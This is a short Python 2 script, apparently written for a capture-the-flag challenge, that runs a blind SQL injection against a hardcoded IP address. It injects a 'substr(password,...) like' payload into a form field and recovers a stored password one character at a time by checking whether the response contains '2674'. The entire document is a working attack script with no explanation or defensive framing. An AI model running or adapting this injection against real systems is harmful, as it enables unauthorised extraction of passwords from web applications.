import requests
import string
url="http://47.75.14.48/"
sample=string.digits+string.ascii_letters
passw=""
for z in range(0,100):
    print z
    for i in sample:
        data={"flag":"1337","hi":"*if(substr(password,%s,1) like %s,1,2) where id like 1"%(str(z),hex(ord(str(i))))}
        #print data
        r=requests.post(url,data=data)
        if r.content.find('2674')<0:
            passw=passw+str(i)
            print r.content
            print passw
            
            #break
